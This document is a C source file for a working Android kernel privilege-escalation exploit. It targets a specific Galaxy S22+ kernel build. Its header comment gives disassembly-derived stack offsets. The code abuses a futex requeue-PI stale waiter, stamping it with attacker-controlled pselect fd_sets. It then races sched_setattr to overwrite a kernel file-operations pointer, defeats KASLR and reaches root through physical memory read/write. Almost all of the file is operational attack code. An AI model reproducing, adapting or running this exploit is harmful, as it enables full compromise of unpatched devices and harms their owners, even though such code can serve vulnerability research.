#include "common.h"

/*
 * S906EXXSEGZE3 (g0q / S22+, taro, 5.10.236-android12-9-31998796) main route —
 * in-process pselect stamp edition.
 *
 * Why pselect and not exp32/exp64: on this kernel __arm64_compat_sys_setsockopt
 * is an ENOSYS stub (mov x0,#-0x26; ret), so the 32-bit compat stamp is dead;
 * and the 64-bit native do_ipv6_setsockopt lays its 264-byte group_source_req
 * at inner sp+0x58, which lands 0x60 short of the stale waiter (STAMP_OFF
 * 0x168 > 0x108 window) — the exp64 stamp cannot reach it either.  The v4
 * ip_setsockopt 264-byte case at sp+0x20 misses by 24 bytes for the same
 * reason.  pselect instead copies three attacker-controlled fd_sets
 * (120 bytes at nfds=320) onto the waiter's own kernel stack, and blocks
 * there — no stamp-then-park timing cliff.
 *
 * GZE3 geometry — derived from disassembly of the extracted stock Image
 * (5.10.236, _text 0xffffffc008000000):
 *
 *   futex chain before futex_wait_requeue_pi entry:
 *     __arm64_sys_futex:          0x70  (sub sp,#0x70; bl do_futex)
 *     do_futex:                   0x70  (sub sp,#0x70; bl futex_wait_requeue_pi)
 *                                 ────
 *                                 0xe0
 *
 *   futex_wait_requeue_pi (@ 0xffffffc00822b020):
 *     sub sp, sp, #0x1a0
 *     add x2, sp, #0x90; bl rt_mutex_wait_proxy_lock  ← x2 = &rt_waiter
 *     rt_waiter = entry_sp - 0x1a0 + 0x90 = entry_sp - 0x110
 *     → rt_waiter = kernel_top - 0xe0 - 0x110 = kernel_top - 0x1f0
 *
 *   pselect chain before core_sys_select entry:
 *     __arm64_sys_pselect6:       0xa0  (sub sp,#0xa0; bl core_sys_select)
 *     core_sys_select:            0x1c0 frame; stack_fds at sp+0x50,
 *       taken iff size=((nfds+63)/8)&~7 < 0x2b, i.e. nfds <= 320.
 *       nfds=320 → size=40; in/out/ex/res arrays contiguous at
 *       x21=sp+0x50, +size, +2*size, +3*size, +4*size, +5*size
 *       (get_fd_set inlined: __check_object_size + _copy_from_user).
 *
 *   in_start = kernel_top - 0xa0 - 0x170 = kernel_top - 0x210
 *   in    @ [top-0x210, top-0x1e8)   (words in[0..4], 40 user bytes)
 *   out   @ [top-0x1e8, top-0x1c0)
 *   ex    @ [top-0x1c0, top-0x198)
 *   res_* @ [top-0x198, top-0x120)   (zeroed by zero_fd_set — predictable 0)
 *   waiter (80B) @ [top-0x1f0, top-0x1a0)
 *
 *   Coverage: in[4]→waiter+0x00, out[0..4]→waiter+0x08..0x28,
 *   ex[0..3]→waiter+0x30..0x48 — the full 80-byte rt_mutex_waiter is
 *   attacker-controlled:
 *     w0 pc    = fake_fops                     (in[4])
 *     w1 right = 0                             (out[0])
 *     w2 left  = kaslr ashmem_misc.fops        (out[1], the WRITE TARGET)
 *     w3..w5 pi_tree_entry = 0 (RB_EMPTY)      (out[2..4])
 *     w6 task  = fake_task (detached)          (ex[0])
 *     w7 lock  = fake_lock (zeroed)            (ex[1])
 *     w8 prio / w9 deadline = 0                (ex[2..3])
 *   in[0..3] and ex[4] sit outside the waiter; keep them 0 (no fds polled).
 *
 * The consumer's sched_setattr nice-bump then walks the stale waiter exactly
 * like the exp routes' trigger (rt_mutex_adjust_pi → dequeue → rb_erase
 * writes fake_fops into ashmem_misc.fops).  Afterwards try_cfi_stage()
 * (common fops.c) verifies and continues the shared chain (pipe physrw,
 * umh root).  Each supervisor attempt runs in a fresh child, one consumer
 * shot per attempt.
 */

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int fake_fops_request;
atomic_int fake_fops_done;
int memfd_leak;

/* Consumer tuning for the pselect route: a single sched_setattr shot lands
 * inside the 1-second pselect block; the supervisor sweeps the delay across
 * fresh-child attempts.  (common.h's CONSUMER_MAX_CALLS/BURST/NICE belong to
 * the retired in-tree pselect consumer; these local values match the
 * upstream-tested pselect choreography.) */
#define GZE3_CONSUMER_NICE 19
#define GZE3_CONSUMER_BURST_CALLS 1
#define GZE3_CONSUMER_MAX_CALLS 1
#define GZE3_ROUTE_ATTEMPTS 1

/* set_limit() comes from kernelsnitch/utils.h (NOFILE+NPROC to max). */

static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      return (int)value;
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

/* Dup a valid fd onto every monitored fd number < nfds so the pselect
 * blocks for the full timeout instead of failing EBADF on the payload
 * words (which look like fd bitmasks). */
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  /* NOTE: do NOT park the read end at a monitored fd number.  in[4] holds
   * fake_fops (a kernel VA, top bit set → fd 319 monitored in `in` for
   * readability): a read end with pipe data there reports ready instantly.
   * The read end stays open via pipefd[0]/high_read (fill works, no
   * SIGPIPE); fd 319, if monitored, gets a write end from the loop above
   * (never readable). */
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /* GZE3 word map (see geometry note above). in[0..3]/ex[4] stay 0. */
  fdset_put_word(in, 4, fake_fops);
  fdset_put_word(out, 0, 0);
  fdset_put_word(out, 1, kaslr_image_addr(ASHMEM_MISC_FOPS));
  fdset_put_word(out, 2, 0);
  fdset_put_word(out, 3, 0);
  fdset_put_word(out, 4, 0);
  fdset_put_word(ex, 0, fake_task);
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 0);
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= GZE3_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    /* Fill the pipe so the write ends dup'd onto `out` fd numbers report
     * NOT-writable.  Otherwise pselect returns instantly with ready>0
     * (pipe write ends with an empty buffer are always writable) instead
     * of blocking, and the delayed consumer shot never lands (calls=0).
     * in-fds poll write ends for readability (never ready); ex-fds poll
     * for exceptions (never); fd 319's read end holds data now but sits
     * only in the ex set, so it never reports ready either. */
    {
      int flags = fcntl(pipefd[1], F_GETFL);
      fcntl(pipefd[1], F_SETFL, flags | O_NONBLOCK);
      static char fill[8192];
      memset(fill, 0x5a, sizeof(fill));
      ssize_t w;
      do {
        w = write(pipefd[1], fill, sizeof(fill));
      } while (w > 0);
      fcntl(pipefd[1], F_SETFL, flags);
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    pr_info("pselect stamp words in4=%016llx out1=%016llx ex0=%016llx ex1=%016llx delay=%d\n",
            (unsigned long long)fake_fops,
            (unsigned long long)kaslr_image_addr(ASHMEM_MISC_FOPS),
            (unsigned long long)fake_task,
            (unsigned long long)fake_lock, delay_usec);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, GZE3_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

static void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  /* WRPI returned (requeued by main's CMP_REQUEUE_PI): pi_blocked_on now
   * dangles at our kernel stack slot.  Stamp it via pselect fd_sets, then
   * release pi_chain.  The pselect blocks up to PSELECT_TIMEOUT_SEC while
   * the consumer fires — the arrays sit on the stale waiter the whole time. */
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

static void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

static void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < GZE3_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, GZE3_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
                     sched_ret, sched_errno, tid, GZE3_CONSUMER_NICE);
        }
        calls_this_seq++;
        if (calls_this_seq >= GZE3_CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

static void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

static void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("SLIDE_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);

  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
  return exploit_ok ? 0 : 1;
}
